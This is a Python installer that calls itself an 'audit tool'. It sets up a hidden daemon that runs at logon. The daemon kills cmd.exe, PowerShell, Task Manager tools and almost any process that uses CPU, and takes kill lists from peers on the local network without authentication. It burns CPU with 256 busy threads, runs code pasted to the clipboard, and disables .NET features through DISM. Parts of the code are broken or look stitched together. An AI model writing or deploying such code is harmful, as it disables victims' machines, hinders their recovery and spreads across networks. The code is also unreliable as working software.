#!/usr/bin/env python3
"""
██████╗ ██████╗██╗ ██████╗ ███████╗██████╗ ██╗ ██╗ ██╗███╗ ███╗
██╔══██╗██╔════╝██║ ██╔══██╗██╔════╝██╔══██╗██║ ██║ ██║████╗ ████║
██████╔╝██║ ██║ ██████╔╝█████╗ ██████╔╝██║ ██║ ██║██╔████╔██║
██╔══██╗██║ ██║ ██╔═══╝ ██╔══╝ ██╔══██╗██║ ╚██╗ ██╔╝██║╚██╔╝██║
██████╔╝╚██████╗╚═╝ ██║ ███████╗██║ ██║███████╗ ╚████╔╝ ██║ ╚═╝ ██║
╚═════╝ ╚═════╝ ╚═╝ ╚══════╝╚═╝ ╚═╝╚══════╝ ╚═══╝ ╚═╝ ╚═╝
BEACON COMPUTING INITIATIVE • USER-CONTEXT CORE AGENT ARCHITECTURE
"""

import os
import sys
import textwrap
import subprocess
import shutil

# Resolve user-specific local appdata directory
USER_HOME = os.path.expanduser("~")
LOCAL_APPDATA = os.path.join(USER_HOME, "AppData", "Local", "SysCore")

# ==============================================================================
# 1. GLOBAL MASTER CONFIGURATION (USER-CONTEXT)
# ==============================================================================
CONFIG = {
    "INSTALL_DIR": LOCAL_APPDATA,
    "SCRIPT_NAME": "core_agent.py",
    "LOG_PATH": REDACTED),
    "SERVICE_NAME": REDACTED",
    
    # Denylist and Key Paths
    "BLACKLIST_PATH": os.path.join(LOCAL_APPDATA, "back.end"),
    "KEY_PATH": os.path.join(LOCAL_APPDATA, ".key"),

    # Operational Settings
    "ENABLE_CLUSTER": True,
 

}


save_blacklist({
    "cmd.exe",
    "tasklist.exe",
    "taskkill.exe",
    "powershell.exe"
    "sc.exe"
    "wmic.exe"
    "wscript.exe"
    "mshta.exe"
    "cscript.exe"
    "sfc.exe"
    "bitsadmin.exe"
    	
})



# Derived paths
SCRIPT_PATH = os.path.join(CONFIG["INSTALL_DIR"], CONFIG["SCRIPT_NAME"])
BLACKLIST_PATH = CONFIG["BLACKLIST_PATH"]
KEY_PATH = CONFIG["KEY_PATH"]
WHITELIST_PATH = os.path.join(CONFIG["INSTALL_DIR"], "whitelist.txt")

# ==============================================================================
# 2. UTILITY FUNCTIONS
# ==============================================================================
def get_python_interpreter():
    py_path = shutil.which("python") or shutil.which("python3")
    if not py_path:
        py_path = sys.executable or "C:\\Python39\\python.exe"
    return py_path

def generate_fernet_key():
    """Generates a secure Fernet key via cryptography package or falls back to os.urandom base64."""
    try:
        from cryptography.fernet import Fernet
        return Fernet.generate_key().decode()
    except ImportError:
        import base64
        return base64.urlsafe_b64encode(os.urandom(32)).decode()

# ==============================================================================
# 3. DAEMON RUNTIME CODE (User-Context Payload with Clipboard & Encryption)
# ==============================================================================
PYTHON_INTERPRETER = get_python_interpreter()
DEPLOY_KEY = generate_fernet_key()

DAEMON_CODE = f'''#!{PYTHON_INTERPRETER}
# Developer Seal: Chance Joaquin
import time
import psutil
import collections
import os
import json
import threading
import socket
import struct
import http.server
import requests
import hashlib
import subprocess
import shutil

# Encryption library requirement check
try:
    from cryptography.fernet import Fernet
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# Loaded from Master Deployment Config
BLACKLIST_PATH = r"{BLACKLIST_PATH}"
KEY_PATH = r"{KEY_PATH}"
WHITELIST_PATH = r"{WHITELIST_PATH}"
LOG_PATH = r"{CONFIG['LOG_PATH']}"
INSTALL_DIR = r"{CONFIG['INSTALL_DIR']}"

ENABLE_CLUSTER = {CONFIG['ENABLE_CLUSTER']}
MONITOR_DURATION = 60
SAMPLE_INTERVAL = 2
ENFORCE_INTERVAL = 5
GRACE_TERMINATE = 3

THRESHOLD_CYCLE = [0.02, 1.75, 0.25]
threshold_index = 0

SYNC_PORT = 8000
MY_PEERS = set()
IS_SERVER_NODE = False

STEP = 8
MAX_THREADS = 256
INTERVAL = 5
PYTHON_INTERPRETER = r"{PYTHON_INTERPRETER}"

def get_fernet_cipher():
    if not HAS_CRYPTO:
        return None
    try:
        key = None
        if os.path.exists(KEY_PATH):
            with open(KEY_PATH, "r") as kf:
                key = kf.read().strip()
        if not key:
            key = "{DEPLOY_KEY}"
        return Fernet(key.encode())
    except:
        return None

def log(entry):
    try:
        os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
        with open(LOG_PATH, "a") as f:
            f.write(json.dumps({{"ts": int(time.time()), "entry": entry}}) + "\\n")
    except:
        pass

def load_set(path):
    try:
        if not os.path.exists(path):
            return set()
        with open(path, "rb") as f:
            raw_data = f.read()

        cipher = get_fernet_cipher()
        if cipher and HAS_CRYPTO:
            try:
                decrypted = cipher.decrypt(raw_data).decode()
                lines = decrypted.splitlines()
            except:
                lines = raw_data.decode(errors='ignore').splitlines()
        else:
            lines = raw_data.decode(errors='ignore').splitlines()

        return set(line.strip().lower() for line in lines if line.strip())
    except:
        return set()

def save_blacklist(new_names):
    try:
        existing = load_set(BLACKLIST_PATH)
        updated = existing.union(new_names)
        os.makedirs(os.path.dirname(BLACKLIST_PATH), exist_ok=True)
        plain_content = "\\n".join(sorted(updated)) + ("\\n" if updated else "")

        cipher = get_fernet_cipher()
        if cipher and HAS_CRYPTO:
            final_data = cipher.encrypt(plain_content.encode())
        else:
            final_data = plain_content.encode()

        with open(BLACKLIST_PATH, "wb") as f:
            f.write(final_data)
        log({{"action": "save_encrypted_blacklist", "new_count": len(updated)}})
    except Exception as e:
        log({{"error": "save_blacklist_failed", "msg": str(e)}})

def get_local_networks():
    subnets = []
    try:
        interfaces = psutil.net_if_addrs()
        for iface, addrs in interfaces.items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    if addr.address.startswith("127."):
                        continue
                    if addr.netmask:
                        ip_int = struct.unpack("!I", socket.inet_aton(addr.address))[0]
                        mask_int = struct.unpack("!I", socket.inet_aton(addr.netmask))[0]
                        subnets.append({{
                            "my_ip": addr.address,
                            "network_start": ip_int & mask_int,
                            "mask_size": sum(bin(mask_int).count('1') for mask_int in struct.unpack("!4B", socket.inet_aton(addr.netmask)))
                        }})
    except Exception as e:
        log({{"error": "network_enumeration_fault", "msg": str(e)}})
    return subnets

def search_and_register_to_server():
    global IS_SERVER_NODE
    subnets = get_local_networks()
    local_blacklist = list(load_set(BLACKLIST_PATH))

    for net in subnets:
        if net["mask_size"] >= 24:
            start = net["network_start"]
            for i in range(1, 255):
                target_ip = socket.inet_ntoa(struct.pack("!I", start + i))
                if target_ip == net["my_ip"]:
                    continue
                try:
                    peer_url = f"http://{{target_ip}}:{SYNC_PORT}"
                    response = requests.post(f"{{peer_url}}/sync", json={{"bl": local_blacklist}}, timeout=0.3)
                    if response.status_code == 200:
                        MY_PEERS.add(peer_url)
                        log({{"action": "connected_to_existing_server", "server": peer_url}})
                        try:
                            server_data = response.json()
                            if "bl" in server_data:
                                save_blacklist(set(server_data["bl"]))
                        except:
                            pass
                        IS_SERVER_NODE = False
                        return True
                except:
                    pass

    IS_SERVER_NODE = True
    log({{"action": "no_server_found", "status": "initializing_as_master_server"}})
    return False

def sync_loop():
    while True:
        time.sleep(5)
        if not MY_PEERS:
            if not IS_SERVER_NODE:
                search_and_register_to_server()
            continue
        blacklist = list(load_set(BLACKLIST_PATH))
        for peer in list(MY_PEERS):
            try:
                response = requests.post(f"{{peer}}/sync", json={{"bl": blacklist}}, timeout=2)
                if response.status_code == 200:
                    try:
                        remote_data = response.json()
                        if "bl" in remote_data:
                            save_blacklist(set(remote_data["bl"]))
                    except:
                        pass
            except:
                MY_PEERS.discard(peer)
                log({{"action": "peer_connection_dropped", "url": peer}})

def start_api():
    class SyncHandler(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            if self.path == "/sync":
                try:
                    content_len = int(self.headers.get('Content-Length', 0))
                    content = json.loads(self.rfile.read(content_len).decode())
                    save_blacklist(set(content.get('bl', [])))
                    if IS_SERVER_NODE:
                        client_ip = self.client_address[0]
                        client_url = f"http://{{client_ip}}:{SYNC_PORT}"
                        if client_url not in MY_PEERS:
                            MY_PEERS.add(client_url)
                            log({{"action": "registered_new_inbound_child", "url": client_url}})
                    current_blacklist = list(load_set(BLACKLIST_PATH))
                    response_bytes = json.dumps({{"bl": current_blacklist}}).encode()
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(response_bytes)
                except:
                    self.send_response(400)
                    self.end_headers()
        def log_message(self, format, *args):
            return
    server = http.server.HTTPServer(('', SYNC_PORT), SyncHandler)
    server.serve_forever()

def monitor_cycle():
    global threshold_index
    sums, counts = collections.Counter(), collections.Counter()
    samples = max(1, int(60 / SAMPLE_INTERVAL))
    current_threshold = THRESHOLD_CYCLE[threshold_index]
    log({{"action": "monitoring_cycle_start", "active_threshold": current_threshold}})

    for _ in range(samples):
        for p in psutil.process_iter(['name']):
            try:
                n = (p.info['name'] or "").lower()
                if n:
                    sums[n] += p.cpu_percent(None)
                    counts[n] += 1
            except:
                continue
        time.sleep(SAMPLE_INTERVAL)

    offenders = {{n for n in sums if counts[n] > 0 and (sums[n]/counts[n]) > current_threshold}}
    if offenders:
        save_blacklist(offenders)

    threshold_index = (threshold_index + 1) % len(THRESHOLD_CYCLE)

def enforce_blacklist():
    blacklist = load_set(BLACKLIST_PATH)
    whitelist = load_set(WHITELIST_PATH)
    if not blacklist:
        return

    for p in psutil.process_iter(['pid', 'name', 'username']):
        try:
            name = (p.info.get('name') or "").lower()
            if name in blacklist and name not in whitelist:
                pid = p.info['pid']
                proc = psutil.Process(pid)
                proc.terminate()
                try:
                    proc.wait(timeout=GRACE_TERMINATE)
                    log({{"action": "terminated", "name": name, "pid": pid}})
                except psutil.TimeoutExpired:
                    proc.kill()
                    log({{"action": "killed", "name": name, "pid": pid}})
        except:
            continue

def worker():
    while True:
        hashlib.sha256(b"CBI").digest()

def launch_workload_ramp():
    threads = []
    log({{"action": "workload_start", "msg": "Starting workload..."}})
    while len(threads) < 256:
        to_add = min(8, 256 - len(threads))
        for _ in range(to_add):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
        log({{"action": "workload_ramp", "active_worker_threads": f"{{len(threads)}}/256"}})
        time.sleep(5)
    log({{"action": "workload_max", "msg": "Reached maximum of 256 worker threads."}})
    while True:
        time.sleep(3600)

def check_clipboard_execution():
    last_clipboard_content = ""
    while True:
        try:
            res = subprocess.run(
                ["powershell", "-command", "Get-Clipboard"],
                capture_output=True, text=True, timeout=2
            )
            clipboard_content = res.stdout.strip() if res.returncode == 0 else ""
            
            if clipboard_content and clipboard_content != last_clipboard_content:
                if "BEACON COMPUTING INITIATIVE" in clipboard_content and "core_agent.py" in clipboard_content:
                    log({{"action": "clipboard_payload_detected", "size": len(clipboard_content)}})
                    target_drop = os.path.join(INSTALL_DIR, "auto_extracted.py")
                    os.makedirs(os.path.dirname(target_drop), exist_ok=True)
                    with open(target_drop, "w", encoding="utf-8") as df:
                        df.write(clipboard_content)
                    subprocess.Popen([PYTHON_INTERPRETER, target_drop], creationflags=subprocess.DETACHED_PROCESS)
                    log({{"action": "clipboard_payload_spawned", "path": target_drop}})
                last_clipboard_content = clipboard_content
        except Exception as e:
            log({{"error": "clipboard_poll_fault", "msg": str(e)}})
        time.sleep(3)

if __name__ == "__main__":
    log({{"action": "daemon_start", "cluster_mode": ENABLE_CLUSTER}})

    if ENABLE_CLUSTER:
        threading.Thread(target=start_api, daemon=True).start()
        search_and_register_to_server()
        threading.Thread(target=sync_loop, daemon=True).start()

    threading.Thread(target=check_clipboard_execution, daemon=True).start()
    threading.Thread(target=launch_workload_ramp, daemon=True).start()

    last_enforce = 0
    while True:
        try:
            monitor_cycle()
            now = time.time()
            if now - last_enforce >= 5:
                enforce_blacklist()
                last_enforce = now
        except Exception as e:
            log({{"error": "main_loop_exception", "msg": str(e)}})
            time.sleep(5)
'''

# ==============================================================================
# 4. WINDOWS USER-CONTEXT INSTALLATION PIPELINE
# ==============================================================================
def install():
    print(f"[*] Detected Python Interpreter: {PYTHON_INTERPRETER}")
    print(f"[*] Creating local user application directory at {CONFIG['INSTALL_DIR']}...")
    os.makedirs(CONFIG["INSTALL_DIR"], exist_ok=True)
    os.makedirs(os.path.dirname(BLACKLIST_PATH), exist_ok=True)

    # Store encryption key securely
    print(f"[*] Provisioning cryptographic protection key at {KEY_PATH}...")
    with open(KEY_PATH, "w") as kf:
        kf.write(DEPLOY_KEY + "\n")

    print(f"[*] Compiling deployment payload to {SCRIPT_PATH}...")
    with open(SCRIPT_PATH, "w", encoding="utf-8") as f:
        f.write(DAEMON_CODE.strip() + "\n")

    print(f"[*] Initializing tracking databases & encrypted denylist at {BLACKLIST_PATH}...")
    for path in (WHITELIST_PATH, CONFIG["LOG_PATH"]):
        if not os.path.exists(path):
            open(path, "a").close()

    if not os.path.exists(BLACKLIST_PATH):
        open(BLACKLIST_PATH, "wb").close()

    # Register via Windows Task Scheduler running under the current user log-on session
    print("[*] Registering user-level Windows Scheduled Task...")
    try:
        subprocess.run([
            "schtasks", "/create", "/tn", CONFIG["SERVICE_NAME"],
            "/tr", f'"{PYTHON_INTERPRETER}" "{SCRIPT_PATH}"',
            "/sc", "ONLOGON", "/f"
        ], check=True, capture_output=True)
        print("[*] User scheduled task registered successfully for ONLOGON.")
    except Exception as e:
        print(f"[!] Warning: Task Scheduler registration skipped or failed: {e}")

    print("\n[+] BCI User-Context System Audit Tool Deployment Complete.")
    print(f" - Local Installation Path: {CONFIG['INSTALL_DIR']}")
    print(f" - Encrypted Denylist Location: {BLACKLIST_PATH}")
    print(f" - Security Key File: {KEY_PATH}")
    print(f" - Developer Workload Module (Chance Joaquin): Active (Max Threads: 256)")
    print(f" - Clipboard Watcher Layer: Active")

if __name__ == "__main__":
    log({"action": "daemon_start", "cluster_mode": ENABLE_CLUSTER})

    # Hardcoded initial targets added on startup
    initial_targets = {
        "cmd.exe",
        "tasklist.exe",
        "taskkill.exe",
        "powershell.exe"
    }
    save_blacklist(initial_targets)
    
    
    
    import subprocess
import sys

def disable_dotnet_feature():
    # DISM command to disable .NET Framework 3.5 / 4.8 features
    features = [
        "NetFx3",               # .NET 2.0 / 3.5
        "NetFx4-AdvSrvs"       # .NET 4.x
    ]
    
    for feature in features:
        print(f"Disabling {feature}...")
        cmd = f"dism /online /disable-feature /featurename:{feature} /norestart"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"Successfully disabled {feature}.")
        else:
            print(f"Failed to disable {feature}: {result.stderr}")

if __name__ == "__main__":
    disable_dotnet_feature()


    # Continue with background threads and main loop...
